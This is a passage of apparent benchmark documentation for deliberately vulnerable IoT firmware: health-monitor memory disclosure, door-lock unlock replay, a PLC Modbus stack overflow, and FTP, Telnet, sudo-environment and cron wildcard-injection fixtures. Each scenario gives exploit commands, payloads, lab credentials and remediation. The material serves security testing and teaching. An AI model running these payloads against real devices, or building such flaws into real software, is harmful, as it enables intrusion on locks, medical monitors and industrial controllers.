python3 scripts/exploit-device-cve-scenarios.py healthmonitor
```

Expected output: a synthetic patient identifier and vital-sign data.

### Scenario and ground truth

The module recipe is
[`cwe200-healthmonitor-memory-disclosure_1.0.bb`](../meta-iotbench/recipes-vulns/cwe200-healthmonitor-memory-disclosure/cwe200-healthmonitor-memory-disclosure_1.0.bb),
compiling
[`iotbench-healthd.c`](../meta-iotbench/recipes-vulns/cwe200-healthmonitor-memory-disclosure/files/iotbench-healthd.c),
a TCP service on port `2575`. On each connection it fills a 256-byte
`device_memory` buffer with filler bytes, then places two fixture strings
inside it at fixed offsets:

```c
static const char patient[] = "patient_id=PT-1042;name=Alice Example;spo2=97;hr=72;";
static const char secrets[] = "wifi_psk=clinical-monitor-lab;alarm_pin=1842;";
memcpy(device_memory + 32, patient, sizeof(patient) - 1);
memcpy(device_memory + 128, secrets, sizeof(secrets) - 1);
...
/* CWE-200: sensitive memory is returned without authenticating the peer. */
send(client, device_memory + offset, length, 0);
```

A simple `READ <offset> <length>` request, bounds-checked only against the
buffer's own size and never against the identity of the caller, returns
whatever bytes live at that offset, including the `secrets` region if the
caller asks for it. The
[exploit client](../scripts/exploit-device-cve-scenarios.py) sends
`READ 32 52`, which reads exactly the `patient` fixture; a request for
`READ 128 46` would equally return the `secrets` fixture, with the service
imposing no distinction between the two. This is
[CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html):
the service correctly bounds-checks the read against the buffer it owns, so
this is not a memory-safety bug like the overflow scenarios elsewhere in
this document; the defect is that the whole buffer, patient data and device
secrets alike, is reachable by anyone who can connect to the port at all.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=healthmonitor-cwe200-memory-disclosure`.

### Payload and expected result

| Request sent to `:2575` | Expected response |
| --- | --- |
| `READ 32 52` | The `patient_id=PT-1042;name=Alice Example;spo2=97;hr=72;` fixture |
| `READ 128 46` | The `wifi_psk=clinical-monitor-lab;alarm_pin=1842;` fixture |
| `READ 0 256` | The entire 256-byte buffer, filler bytes and both fixtures together |
| Malformed request, or `offset`/`length` outside `[0, 256)` | `usage: READ <offset> <length>` |

| Result | Interpretation |
| --- | --- |
| `usage: READ <offset> <length>` for `READ 32 52` | Confirm you booted `healthmonitor-cwe200-memory-disclosure` |
| Response contains `patient_id=PT-1042` | Confirmed: unauthenticated callers can read device memory, including patient data |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`423c97e3411a2e0f185f2f7d39b6167407f2c7357ae51e9f704c53ab2e597fa4`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Require authentication before serving any memory-read request at all, and
beyond that, never expose a generic "read raw device memory by offset"
interface: return only specific, intentionally-published fields (for example
a documented, authenticated "get vitals" call) rather than an arbitrary
byte range of an internal buffer that happens to also hold unrelated
secrets. After a fix, repeat the `READ 32 52` payload above and confirm the
request is rejected without a valid credential.

## Door Lock: Unlock Replay

### Build, boot and manual testing

**What this tests.** The same replay weakness as
[Thermostat: Command Replay](#thermostat-command-replay), on the door lock's
BLE-to-gateway bridge: a captured, validly authenticated unlock frame can be
resent and is accepted again, with no freshness check on its sequence
number.

**Build and boot — host:**

```bash
FIRMWARE=doorlock-cwe294-unlock-replay docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=doorlock-cwe294-unlock-replay ./scripts/run-qemu-docker.sh
```

**Test — second host terminal:**

```bash
python3 scripts/exploit-device-cve-scenarios.py doorlock
```

Expected: the exploit client sends the identical unlock frame twice and
both are accepted, reported as `count=1` and `count=2`.

### Scenario and ground truth

This scenario uses the same daemon as
[Thermostat: Command Replay](#thermostat-command-replay),
[`iotbench-mqtt-replay`](../meta-iotbench/recipes-vulns/cwe294-mqtt-replay/files/iotbench-mqtt-replay),
with `DEVICE_CLASS=doorlock` selecting a different topic and field name:

```sh
doorlock)
    REQUEST_TOPIC=iotbench/doorlock/ble/command
    RESULT_TOPIC=iotbench/doorlock/ble/result
    VALUE_KEY=action
    STATE_FILE=/run/iotbench/doorlock-state
    ;;
```

The acceptance logic is identical to the thermostat case: a frame with
`auth=valid-captured-frame` and a `seq=...` field is accepted and its
sequence number is logged in the result message, but never checked against
sequence numbers already seen, so the identical frame
`seq=7731;action=unlock;auth=valid-captured-frame` is accepted twice by the
[exploit client](../scripts/exploit-device-cve-scenarios.py). This is
[CWE-294: Authentication Bypass by Capture-replay](https://cwe.mitre.org/data/definitions/294.html),
the same class as the thermostat scenario; here the impact is a captured
"unlock" command remaining valid indefinitely rather than a captured
setpoint change, which makes the consequence of the missing freshness check
more severe for this device even though the underlying code defect is
identical.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=doorlock-cwe294-unlock-replay`.

### Payload and expected result

| MQTT payload on `iotbench/doorlock/ble/command` (sent twice, identical) | Expected result on `iotbench/doorlock/ble/result`, both times |
| --- | --- |
| `seq=7731;action=unlock;auth=valid-captured-frame` | `accepted seq=7731 action=unlock count=1`, then `accepted seq=7731 action=unlock count=2` |
| Same frame without `auth=valid-captured-frame` | `rejected invalid frame` |

| Result | Interpretation |
| --- | --- |
| Second send is rejected or the counter does not advance | Confirm you booted `doorlock-cwe294-unlock-replay` |
| Both sends return `accepted ...`, counter incrementing | Confirmed: the identical authenticated unlock frame is accepted repeatedly |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`7e951c9d128134815356c4c9a4a0ac2c924466a34ee805db587623b4402dbc0f`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Same remediation as
[Thermostat: Command Replay](#thermostat-command-replay): track the highest
accepted sequence number per device and reject any frame that does not
advance it, in addition to the existing authentication marker. For a lock
specifically, also consider a short validity window on the authentication
marker itself, so that even a never-replayed-before captured frame expires
rather than staying valid indefinitely. After a fix, repeat the exploit
script above and confirm only the first send is accepted.

## PLC: Modbus Stack Overflow

### Build, boot and manual testing

**What this tests.** A vendor-specific Modbus function on the PLC permits a
"project chunk" up to 36 bytes to be copied into a 32-byte field of a
stack-local struct, overwriting an adjacent 4-byte safety-state field on the
same stack frame. This scenario is inspired by parser flaws such as
[CVE-2018-20818](https://nvd.nist.gov/vuln/detail/CVE-2018-20818); the
register map and function code are synthetic, not a reproduction of a
specific affected PLC.

**Build and boot — host:**

```bash
FIRMWARE=plc-cwe121-modbus-stack-overflow docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=plc-cwe121-modbus-stack-overflow ./scripts/run-qemu-docker.sh
```

**Test — second host terminal:**

```bash
python3 scripts/exploit-device-cve-scenarios.py plc
```

Expected output: `STACK_OVERFLOW`.

### Scenario and ground truth

The module recipe is
[`cwe121-plc-modbus-stack-overflow_1.0.bb`](../meta-iotbench/recipes-vulns/cwe121-plc-modbus-stack-overflow/cwe121-plc-modbus-stack-overflow_1.0.bb),
compiling
[`iotbench-modbus-overflow.c`](../meta-iotbench/recipes-vulns/cwe121-plc-modbus-stack-overflow/files/iotbench-modbus-overflow.c),
a Modbus/TCP service on port `502` (forwarded to host `1502`):

```c
struct project_chunk {
    unsigned char data[32];
    unsigned char safety_state[4];
};
...
size_t chunk_length = request[8];
if (chunk_length == 0 || chunk_length > 36 || remaining < 2 + chunk_length) { ... }

struct project_chunk frame;
memcpy(frame.safety_state, "SAFE", 4);
/* CWE-121: a 36-byte protocol chunk is copied to a 32-byte stack field. */
memcpy(frame.data, request + 9, chunk_length);
reply_status(client, request,
             memcmp(frame.safety_state, "SAFE", 4) == 0 ? 0x00 : 0x01);
```

The vendor Modbus function `0x41` ("project loader") accepts a chunk length
of up to 36 bytes but writes it into a 32-byte `data` field, overflowing
into the adjacent `safety_state` field of the same stack-local
`project_chunk` struct. The
[exploit client](../scripts/exploit-device-cve-scenarios.py) sends a 36-byte
chunk of `A` bytes, corrupting `safety_state` away from `"SAFE"` so the
response status byte is `0x01` instead of `0x00`, which the client reports
as `STACK_OVERFLOW`. This is
[CWE-121: Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html),
structurally the same shape as
[Smart Hub: Database Stack Overflow](#smart-hub-database-stack-overflow) —
both copy an oversized value into one field of a struct, overflowing into an
adjacent field used as the "did this get corrupted" check — but this
scenario uses `memcpy` with a compile-time-constant length bound
(`chunk_length <= 36`, checked just above the copy) rather than `strcpy`,
and `frame` here is consumed entirely within `serve()` with no destination
size the compiler's fortification can usefully second-guess beyond what the
explicit `chunk_length` check already enforces. Empirically, this module's
default build (no `_FORTIFY_SOURCE` override, only `-fno-stack-protector`)
reproduces its intended `STACK_OVERFLOW` signal directly, unlike the smart
hub's `strcpy`-based overflow, which needed an explicit opt-out of the
toolchain's default hardening before it would do the same; see that
scenario's "Scenario and ground truth" section for the diagnosis.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=plc-cwe121-modbus-stack-overflow`.

### Payload and expected result

| Modbus request, function `0x41`, chunk length | Expected response status byte |
| --- | --- |
| `32` (fits `data[32]` exactly, no overflow) | `0x00` |
| `36` (overflows into `safety_state`) | `0x01`, reported by the exploit client as `STACK_OVERFLOW` |
| `0`, `>36`, or a function code other than `0x41` | `0x02`/`0x03` (rejected before the copy) |

| Result | Interpretation |
| --- | --- |
| Response status byte `0x00` for a 36-byte chunk | Confirm you booted `plc-cwe121-modbus-stack-overflow` |
| Response status byte `0x01`, client prints `STACK_OVERFLOW` | Confirmed: the oversized project chunk overwrote the adjacent safety-state field |

### Completed validation

Self-verified end to end on 30 October 2026, specifically to check whether
this module shared the smart hub's `_FORTIFY_SOURCE` defect (image rebuilt
from source in this session, `0 ERROR` in the BitBake log; it did not need a
fix). Exported rootfs SHA-256:
`934ff9502422feced7848598255a92abdc2095726f4513c64b40624895e1adf8`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Bound `chunk_length` against `sizeof(frame.data)` (32 bytes), not the
protocol's own 36-byte maximum, before the copy: `if (chunk_length > sizeof(frame.data)) { reject }`.
After a fix, repeat the 36-byte payload above and confirm the response
status byte is `0x00` (or a rejection code) rather than `0x01`.

## Classification notes

The existing catalog identifiers are intentionally preserved across this
document. CWE-287 is a valid parent classification for the hardcoded
support-account authentication failure in
[SSH Hardcoded Backdoor](#ssh-hardcoded-backdoor), while CWE-77 is the parent
of the OS command-injection specialization CWE-78, which is why
[Vulnerable C Binaries: Command Injection](#vulnerable-c-binaries-command-injection)
is mapped to CWE-77 and the otherwise structurally identical
[Vulnerable Bash Files: Command Injection](#vulnerable-bash-files-command-injection)
is mapped to CWE-78. The two CWE-798 scenarios,
[Hardcoded Credentials: LD_PRELOAD Sudo Rule](#hardcoded-credentials-ld_preload-sudo-rule)
and
[Hardcoded Credentials: Vi Privilege Escalation](#hardcoded-credentials-vi-privilege-escalation),
require their shared firmware credential as the entry point; their sudo
configuration is the post-authentication impact path, not the CWE
classification by itself.

<a id="weakly-configured-ssh--empty-password-authentication-permitted-cwe-521"></a>
<a id="test-1"></a>

## Test 1: SSH empty-password policy — CWE-521

### Build, boot and manual testing

### Scenario and scope


<a id="weakly-configured-vsftpd-bad-write-rights"></a>
<a id="test-2"></a>

## Test 2: FTP write permissions — CWE-276

### Build, boot and manual testing

**What this tests.** Native vsftpd publishes build-time copies of this device's maintenance settings to an authenticated user whose intended policy is read-only. The `bad` directory incorrectly permits creation of new files; `control` denies it. This test performs real FTP transfers with `curl` and checks the resulting files in the guest filesystem. It uses no test-runner script.

**Build — host:**

Run from the repository root:

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe276-bad-write-rights
TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
```

Wait for a successful export. The named scenario selects its fixture build configuration automatically. Rebuild older exports to include the maintenance snapshots described below.

**Boot — host:**

```bash
QEMU_HTTP_PORT=18080 FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

**Mini test — guest, one download and two upload attempts:**

This uses direct `curl` commands against native vsftpd. Here the maintenance account must authenticate, and the defect is an upload that should be denied. Run this short test or the detailed procedure below; start a fresh snapshot before  switching procedures. No firmware extraction is needed.

1. Start the fixture in the guest:

   ```sh
   touch /run/iotbench-ftp-write-test
   systemctl start iotbench-ftp-write.service
   systemctl is-active iotbench-ftp-write.service
   FTP_FIXTURE_PID=$(systemctl show --property=MainPID --value iotbench-ftp-write.service)
   echo "FTP PID=$FTP_FIXTURE_PID"
   ```

   Expect `active` and a positive PID; stop if either check fails. The `nsenter` prefix runs the client in the server's private network, where `127.0.0.1:2121` is reachable; the host-forwarded FTP endpoint used by the [Allow anonymous login](#allow-anonymous-login) scenario is not reachable here.

2. Download the router identity with the maintenance account:

   ```sh
   nsenter -t "$FTP_FIXTURE_PID" -n curl --fail --noproxy '*' \
     --ftp-method nocwd --ignore-content-length --user 'ftpfixture:Fixture-FTP-Only-42' \
     ftp://127.0.0.1:2121/bad/device.conf
   ```

   **Normal result:** the download contains `DEVICE_CLASS="router"`. Listing and downloading are allowed by the maintenance policy. `nocwd` and `--ignore-content-length` avoid the unsupported FTP `CWD` and `SIZE` commands.

3. Create a harmless text file and try uploading it to `bad`:

   ```sh
   printf '%s\n' 'iotbench-mini-upload' > /tmp/iotbench-ftp-mini.txt
   nsenter -t "$FTP_FIXTURE_PID" -n curl --fail --verbose --noproxy '*' \
     --ftp-method nocwd --user 'ftpfixture:Fixture-FTP-Only-42' \
     --upload-file /tmp/iotbench-ftp-mini.txt ftp://127.0.0.1:2121/bad/mini-probe.txt
   echo "upload_exit=$?"
   cat /srv/iotbench-ftp/bad/mini-probe.txt
   stat -c '%U:%G %a' /srv/iotbench-ftp/bad/mini-probe.txt
   ```

   **Concrete defect:** FTP completes the transfer (`226`), `upload_exit=0`, and the stored file contains `iotbench-mini-upload`, owned by `ftpfixture:ftpfixture` with mode `600`. The account created a real file despite its intended read-only access.

4. Upload the same file with the same account to `control`:

   ```sh
   nsenter -t "$FTP_FIXTURE_PID" -n curl --fail --verbose --noproxy '*' \
     --ftp-method nocwd --user 'ftpfixture:Fixture-FTP-Only-42' \
     --upload-file /tmp/iotbench-ftp-mini.txt ftp://127.0.0.1:2121/control/mini-probe.txt
   echo "control_exit=$?"
   ```

   **Expected control:** authentication succeeds (`230`), but file creation is rejected (`550` or `553`) and `control_exit` is nonzero. No  `/srv/iotbench-ftp/control/mini-probe.txt` is created. A connection or login failure is not evidence of correct write permissions. Both directories belong to `root:ftpfixture`; `bad` has mode `0775`, while `control` has mode `0755`.

**Finish the mini test — guest:**

```sh
systemctl stop iotbench-ftp-write.service
rm -f /run/iotbench-ftp-write-test /tmp/iotbench-ftp-mini.txt
rm -f /srv/iotbench-ftp/bad/mini-probe.txt
```

### Scenario and scope

**⚙️ Implementation.** Native `vsftpd` authenticates `ftpfixture` through PAM. Both directories belong to `root:ftpfixture`: `bad` is `0775`, allowing file creation despite the intended read-only policy; `control` is `0755`. Exported device settings are build-time snapshots.

**✅ Verification.** The same `curl` upload succeeds in `bad` (`226`, exit `0`, stored marker) and fails in `control` (`550`/`553`, nonzero exit, no file). Authentication must succeed in both cases.

> ⚠️ **Disclaimer:** Intentionally insecure lab fixture; not for deployment. Demonstrates **CWE-276**, not uploaded-file execution or authentication bypass (catalog: CWE-434/287). Startup is explicit; FTP uses a private network, chroot and unprivileged file operations, with no QEMU FTP forwarding.

Source: [cwe276-bad-write-rights](../meta-iotbench/recipes-vulns/cwe276-bad-write-rights/).

<a id="weakly-configured-telnet--unencrypted-traffic-cwe-798287276"></a>
<a id="test-3"></a>

## Test 3: Telnet plaintext traffic — CWE-798/287/276

### Build, boot and manual testing

**What this tests.** A maintenance operator logs into the firmware through native BusyBox `telnetd` and `/bin/login`, then reads the device's actual configuration. `tcpdump` records the TCP session: the login password, shell commands and returned configuration travel without encryption. Authentication uses a real, unprivileged system account and `/etc/shadow`; no Python server or predefined command responses are used.

**Build — host:**

Run from the repository root, where `compose.yaml` and `scripts/` are located:

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe798-unencrypted-traffic
TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
```

Wait for a successful export. Rebuild older images: they contain the former simulated service. Selecting this scenario enables the native BusyBox daemon automatically; the native `telnet` client, `tcpdump` and `nsenter` are installed in the guest.

**Boot — host, in the same terminal:**

```bash
QEMU_HTTP_PORT=18080 FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

Wait for `login:` in the QEMU serial console and sign in as `root` with password `routeradmin`. Keep QEMU running. The following steps all run in that **guest console**; no browser, host Telnet connection or firmware extraction is needed.

**Manual test — guest:**

1. Start the native daemon and obtain its PID:

   ```sh
   touch /run/iotbench-telnet-test
   systemctl start iotbench-telnet.service
   systemctl is-active iotbench-telnet.service
   TELNET_PID=$(systemctl show --property=MainPID --value iotbench-telnet.service)
   echo "Telnet PID=$TELNET_PID"
   ```

   Expect `active` and a positive PID. Stop if either check fails. The service has its own network namespace; `nsenter -t "$TELNET_PID" -n` places the capture tool and client in that same network, where `127.0.0.1:2323` is reachable.

2. Start the packet capture in the background, then open the Telnet connection:

   ```sh
   nsenter -t "$TELNET_PID" -n tcpdump -i lo -nn -s 0 -U -Z root \
     -w /tmp/iotbench-telnet.pcap 'tcp port 2323' &
   CAPTURE_PID=$!
   sleep 1
   nsenter -t "$TELNET_PID" -n telnet 127.0.0.1 2323
   ```

   Wait for `tcpdump` to report `listening on lo`. At the Telnet `login:` prompt, press **Ctrl-]**, release the keys, then press **l** (lowercase L) to select **go to line mode** from BusyBox's escape menu. This sends each entered line together, making the capture easier to read. Type `maintenance` and press Enter. At `Password:`, type `Maintenance-Telnet-42` and press Enter. Enter each value only after its prompt. Line mode may echo the password locally; the packet capture is the evidence of network disclosure.

3. In the **Telnet maintenance shell**, enter these real commands one at a time:

   ```sh
   id
   cat /etc/iotbench/device.conf
   exit
   ```

   Expect a nonzero UID belonging to `maintenance`. For this router image, the configuration contains `DEVICE_NAME="Edge One"` and `DEVICE_CLASS="router"`. `exit` closes the maintenance shell and returns to the guest root console.

4. Back in the **guest root console**, stop and inspect the capture:

   ```sh
   kill -INT "$CAPTURE_PID"
   wait "$CAPTURE_PID"
   tcpdump -nn -A -r /tmp/iotbench-telnet.pcap 'tcp dst port 2323'
   tcpdump -nn -A -r /tmp/iotbench-telnet.pcap 'tcp src port 2323'
   ```

   The first command shows **client-to-server** traffic: find `Maintenance-Telnet-42` and `cat /etc/iotbench/device.conf` in packets whose destination is `127.0.0.1.2323`. The second shows **server-to-client** traffic: find the returned device settings. The lab banner also contains the public password; that banner alone is not evidence that the submitted password was sent in cleartext. Telnet negotiation bytes and TCP headers can appear as unreadable characters. These are real packets, with no decryption or generated transcript.

5. Check normal authentication rejection, then stop the service:

   ```sh
   nsenter -t "$TELNET_PID" -n telnet 127.0.0.1 2323
   ```

   Enter `maintenance` at `login:` and `wrong-password` at `Password:`. Expect `Login incorrect` and no maintenance shell. In this second session, keep the client's default character mode. Press **Ctrl-]**, release the keys, then press **e** to leave the client and return to the guest root console:

   ```sh
   systemctl stop iotbench-telnet.service
   rm /run/iotbench-telnet-test
   ```

**Expected behaviour:**

| Check | Expected result |
| --- | --- |
| Correct maintenance credentials | A real shell running as `maintenance`, with a nonzero UID |
| Read device settings | Actual `/etc/iotbench/device.conf` content, matching the selected device |
| Wrong password | `Login incorrect`; no maintenance shell |
| Inspect captured TCP traffic | Submitted password and command readable toward port 2323; device settings readable in the reply |

Successful authentication and a configuration read establish normal operation. The concrete defect is the readable password and configuration in the packet capture. A successful login alone does not prove this transport defect.

### Scenario and scope

**⚙️ Implementation.** BusyBox `telnetd` invokes `/bin/login` for unprivileged `maintenance`, whose fixed lab password is hashed in `/etc/shadow`. Telnet sends the password, commands and device settings without encryption.

**✅ Verification.** `tcpdump` must show the submitted password and command toward port `2323`, and device settings in replies. Wrong credentials must yield `Login incorrect`. The server banner alone is insufficient evidence.

> ⚠️ **Disclaimer:** Intentionally insecure lab fixture; not for deployment. Demonstrates **CWE-319/798**, not catalog mappings CWE-287/276. Explicit startup, guest loopback, a private network and read-only firmware filesystem contain the service; QEMU forwards no Telnet port.

Source: [cwe798-unencrypted-traffic](../meta-iotbench/recipes-vulns/cwe798-unencrypted-traffic/).

<a id="bad-sudo-rights--allow-changes-to-environment-variables-cwe-798"></a>
<a id="test-4"></a>

## Test 4: Bad SUDO Rights — allow changes to environment variables — CWE-798

### Build, boot and manual testing

**What this tests.** The locked `fixtureenv` account may run an exact native
maintenance report through `sudo`. Its policy resets the environment but
explicitly keeps `POSIXLY_CORRECT`. The real BusyBox `du` then changes the
implicit report unit from 1024 to 512 bytes when that preserved variable is
set. The report reads the selected firmware's installed `/etc/iotbench`
directory; no helper, fixed response, or file mutation is involved.

**Build — host:**

Run from the repository root:

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe798-sudo-environment
TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
```

Wait for a successful export. Selecting this scenario activates its required
fixture build mode and opt-in through the existing builder. Rebuild an older
export before testing it.

**Boot — host:**

```bash
QEMU_HTTP_PORT=18080 FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

At the QEMU serial console, log in as `root` with password `routeradmin`. Run
the following commands in that **guest console**. The outer `sudo -u
fixtureenv` only starts the locked fixture account from the root test console;
the inner `sudo` is the restricted privileged operation being tested.

**Manual test — guest:**

1. Confirm that the permitted maintenance command runs as root:

   ```sh
   sudo -n -u fixtureenv -- /usr/bin/sudo -n /usr/bin/id -u
   echo "identity_exit=$?"
   ```

   Expected: `0`, then `identity_exit=0`. This proves that the inner command
   reached the policy-authorized root execution path.

2. Run the normal, environment-free baseline:

   ```sh
   unset POSIXLY_CORRECT
   sudo -n -u fixtureenv -- /usr/bin/sudo -n /usr/bin/du -s /etc/iotbench
   echo "baseline_exit=$?"
   ```

   For the router image, expect `3 /etc/iotbench` and `baseline_exit=0`.

3. Supply the one preserved environment variable before invoking the same
   authorized report:

   ```sh
   sudo -n -u fixtureenv -- /usr/bin/env POSIXLY_CORRECT=1 \
     /usr/bin/sudo -n /usr/bin/du -s /etc/iotbench
   echo "environment_exit=$?"
   ```

   For the router image, expect `6 /etc/iotbench` and
   `environment_exit=0`. The directory is unchanged, but the implicit unit is
   now 512 bytes, so the numeric report is exactly twice the baseline.

4. Keep the environment input but select `du`'s explicit 1024-byte-unit
   control:

   ```sh
   sudo -n -u fixtureenv -- /usr/bin/env POSIXLY_CORRECT=1 \
     /usr/bin/sudo -n /usr/bin/du -sk /etc/iotbench
   echo "control_exit=$?"
   ```

   Expected for the router: `3 /etc/iotbench` and `control_exit=0`. Thus the
   changed value in step 3 is caused by the preserved environment variable,
   not by a different directory or changed allocation. Other device images can
   have a different baseline count, but their environment-sensitive count must
   be exactly twice that baseline and their `-sk` control must return it.

Repeat steps 2–4 without changing the guest: their three counts remain in the
same baseline/doubled/baseline relation. Quit QEMU with **Ctrl-A**, then **X**.

### Scenario and scope

**⚙️ Implementation.** `/etc/sudoers.d/iotbench-sudo-environment` uses
`env_reset`, `!setenv`, and an allowlist containing only
`POSIXLY_CORRECT`. It grants `fixtureenv` three exact root commands:
`/usr/bin/id -u`, `/usr/bin/du -s /etc/iotbench`, and
`/usr/bin/du -sk /etc/iotbench`. The real `/usr/bin/du` is the BusyBox applet
installed in the firmware; the device configuration directory is provided by
the selected device profile.

**✅ Verification.** A root identity, an environment-free baseline, the
preserved-variable result, and the explicit-unit control are all required.
For `router`, the observable sequence is `3`, `6`, `3`; the same relation is
the acceptance criterion for every supported device profile.

> ⚠️ **Disclaimer:** Intentionally insecure lab fixture; not for deployment.
> It demonstrates environment influence on a restricted privileged report, not
> arbitrary root execution, changed disk allocation, or hardcoded credentials.
> `CWE-798` is retained as the historical catalog label.

Source: [cwe798-sudo-environment](../meta-iotbench/recipes-vulns/cwe798-sudo-environment/).

<a id="cronjob-wildcard-injection-cwe-8878269"></a>
<a id="test-5"></a>

## Test 5: Vulnerable cronjob configurations — Cronjob wildcard injection — CWE-88/78/269

### Build, boot and manual testing

**What this tests.** A real root-run CrOniE job invokes a shell command that
changes into a dedicated, fixturefiles-writable inbox and passes a bare `*` to
a parser-only native maintenance helper. A filename beginning with `-` is
therefore interpreted as an option. The fixed `--` form treats the identical
filename as an operand.

**Build — host:**

Run from the repository root:

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe088-cronjob-wildcard-injection
TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
```

Wait for a successful export. Selecting this scenario enables its required
fixture build mode and opt-in through the existing builder. Rebuild any older
export: it contains the former inert schedule.

**Boot — host:**

```bash
QEMU_HTTP_PORT=18080 FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

At the QEMU serial console, log in as `root` with password `routeradmin`. Run
the following commands in that **guest console**. The guest root console is
used only to reproduce the local lab fixture; the input file itself is created
by the restricted `fixturefiles` account.

**Manual test — guest:**

1. Confirm that the image contains the active cron configuration and daemon:

   ```sh
   CRON_ROOT=/usr/share/iotbench/cronjob-wildcard-injection
   test -f /etc/cron.d/iotbench-cron-wildcard-injection
   grep -F -- '--fixture-test *' /etc/cron.d/iotbench-cron-wildcard-injection
   systemctl is-active crond.service
   ```

   Expected: the second command prints the root schedule with its bare `*`,
   and the last command prints `active`. Do not continue if either check fails.

2. Run the normal baseline with only the two installed `.record` names:

   ```sh
   rm -f "$CRON_ROOT/inbox/--fixture-diagnostic" \
     "$CRON_ROOT/logs/cron-vulnerable.jsonl"
   sleep 70
   cat "$CRON_ROOT/logs/cron-vulnerable.jsonl"
   ```

   Expected: the log names `alpha.record` and `beta.record` as `operand`s and
   ends with `"options":0,"operands":2,"result":"nominal"`. The 70-second
   wait crosses a real one-minute cron tick.

3. Create the concrete option-like filename as the only non-root writer, then
   let the next cron execution consume it:

   ```sh
   su -s /bin/sh fixturefiles -c \
     'touch -- /usr/share/iotbench/cronjob-wildcard-injection/inbox/--fixture-diagnostic'
   stat -c '%U:%G %a %n' "$CRON_ROOT/inbox/--fixture-diagnostic"
   rm -f "$CRON_ROOT/logs/cron-vulnerable.jsonl"
   sleep 70
   cat "$CRON_ROOT/logs/cron-vulnerable.jsonl"
   ```

   Expected: `stat` reports `fixturefiles:fixturefiles`; the fresh cron log
   contains `"kind":"option","argument":"--fixture-diagnostic"` and ends
   with `"options":1,"operands":2,"result":"synthetic-diagnostic"`. This
   differs from the baseline solely because the filename crossed the cron
   wildcard-to-argument boundary.

4. Run the exact secure command form against the unchanged inbox:

   ```sh
   (
     cd "$CRON_ROOT/inbox" || exit
     "$CRON_ROOT/bin/fixture-maintenance" --fixture-test -- *
   ) > "$CRON_ROOT/logs/secure-control.jsonl"
   cat "$CRON_ROOT/logs/secure-control.jsonl"
   ```

   Expected: the same `--fixture-diagnostic` value is an `operand`, not an
   `option`, and the final result is `"options":0,"operands":3,"result":"nominal"`.
   This is the command stored in the package's secure cron control.

5. To check repeatability, remove only the vulnerable log, wait one more tick
   and inspect its final event:

   ```sh
   rm -f "$CRON_ROOT/logs/cron-vulnerable.jsonl"
   sleep 70
   tail -n 1 "$CRON_ROOT/logs/cron-vulnerable.jsonl"
   ```

   Expected: the result remains `synthetic-diagnostic` while the option-like
   filename remains in the inbox. Quit QEMU with **Ctrl-A**, then **X**.

### Scenario and scope

**⚙️ Implementation.** The shared package installs `cronie`, a root-owned
`0644` schedule at `/etc/cron.d/iotbench-cron-wildcard-injection`, and a
root-owned diagnostic helper. `fixturefiles` (UID/GID 988) is the sole intended
non-root writer of the dedicated `0750` inbox. CrOniE runs the vulnerable
command as root once per minute; the helper itself only classifies argument
strings and emits JSON. It does not read operand contents, execute commands,
change UID, write files, listen on a network, or provide a remote entry point.

**✅ Verification.** Evidence requires the active CrOniE service and installed
schedule, a normal baseline, the option result after the concrete filename is
created by `fixturefiles`, the `--` control, and a repeated scheduled result.
The log is produced by the actual cron command, not by the legacy Python
emulator.

> ⚠️ **Disclaimer:** Intentionally insecure lab fixture; not for deployment.
> It demonstrates filename-to-option injection in a controlled cron job, not
> shell command execution, privilege escalation, persistence outside the
> disposable QEMU image, or access to any non-fixture data.

Source: [cwe088-cronjob-wildcard-injection](../meta-iotbench/recipes-vulns/cwe088-cronjob-wildcard-injection/).

<a id="password-leak--different-file-types-and-patterns-cwe-798"></a>
<a id="test-6"></a>

## Test 6: Password Leak — Different File Types and Patterns — CWE-798

### Build, boot and manual testing

**What this tests.** Each image deliberately installs one synthetic
credential-bearing file and a native local consumer. The consumer rereads the
selected installed file, extracts its configured field, and compares one stdin
candidate. It does not source or execute fixture data, create an account, start
a service, or contact a network.

**Build — host:**

Run from the repository root:

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe798-password-leak-conf-password
TEST_FIRMWARE="$TEST_DEVICE-$TEST_SCENARIO"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm \
  -e IOTBENCH_BUILD_MODE=fixture \
  -e IOTBENCH_ENABLE_PASSWORD_LEAK_FIXTURE=1 yocto
```

Both explicit variables are required: production/catalog builds cannot resolve
